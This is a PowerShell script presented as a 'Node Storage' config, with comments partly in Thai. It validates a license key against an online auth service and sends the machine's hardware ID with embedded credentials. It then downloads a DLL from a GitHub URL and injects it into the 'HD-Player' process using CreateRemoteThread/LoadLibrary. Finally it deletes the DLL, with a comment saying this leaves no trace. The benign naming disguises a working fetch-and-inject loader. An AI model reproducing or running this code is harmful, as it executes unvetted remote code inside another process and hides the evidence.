# ==========================================
# BASX PROJECT - NODE STORAGE CONFIG
# ==========================================
$Name = "BASXApp1"
$OwnerID = "k6IHOhxMaB"
$Secret = "c756c6e4e539eb2ee4662621f46dd65c0adfe43c073a73b4165e8792f3cf87ae"
$Version = "1.0"

# --- ส่วนของการตรวจสอบ Key ---
function Show-Auth {
    Clear-Host
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "   NODE STORAGE SYSTEM v$Version" -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    $key = Read-Host " Enter License Key"
    
    # ดึง HWID ของเครื่อง
    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    
    # เรียก API KeyAuth
    $url = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&name=$Name&ownerid=$OwnerID&secret=$Secret&version=$Version"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get
        if ($response.success -eq $true) {
            Write-Host "[+] Login Success! Authentication Verified." -ForegroundColor Green
            Start-Sleep -Seconds 2
            return $true
        } else {
            Write-Host "[-] Error: $($response.message)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[!] Connection Error to Auth Server." -ForegroundColor Red
        return $false
    }
}

# --- ส่วนของการ Inject ---
if (Show-Auth) {
    # ลิงก์ไฟล์ DLL จาก GitHub ของคุณ (เปลี่ยน 'ชื่อไฟล์.dll' ให้ตรงกับที่อัปโหลด)
    $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/ชื่อไฟล์.dll"
    $tempPath = "$env:TEMP\node_cache_sys.dll"
    $targetProc = "HD-Player"

    Write-Host "[*] Syncing data from node-storage..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Text;

    public class NodeHandler {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void StartNode(string path, string pName) {
            Process[] target = Process.GetProcessesByName(pName);
            if (target.Length == 0) return;
            IntPtr hProc = OpenProcess(0x001F0FFF, false, target[0].Id);
            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
"@
    Add-Type -TypeDefinition $Source
    [NodeHandler]::StartNode($tempPath, $targetProc)

    Write-Host "[+] Injection Completed. Node Service Active." -ForegroundColor Green
    
    # ลบไฟล์ DLL ทิ้งทันทีเพื่อไม่ให้เหลือร่องรอย
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
} else {
    Write-Host "Closing in 5 seconds..."
    Start-Sleep -Seconds 5
}